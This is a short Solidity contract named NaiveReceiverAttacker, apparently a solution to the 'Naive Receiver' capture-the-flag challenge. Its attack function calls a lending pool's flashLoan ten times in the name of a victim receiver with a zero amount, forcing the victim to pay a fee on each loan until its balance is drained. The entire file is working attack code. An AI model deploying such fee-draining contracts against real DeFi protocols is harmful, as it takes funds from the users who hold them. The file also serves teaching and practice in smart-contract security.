// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    IPool public  pool;

    constructor(address payable _poolAddress) public {
        pool = IPool(_poolAddress);
    }

    function attack(address victim) public {
        // Call the flashLoan function of the pool contract
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0);
        }
    }
}
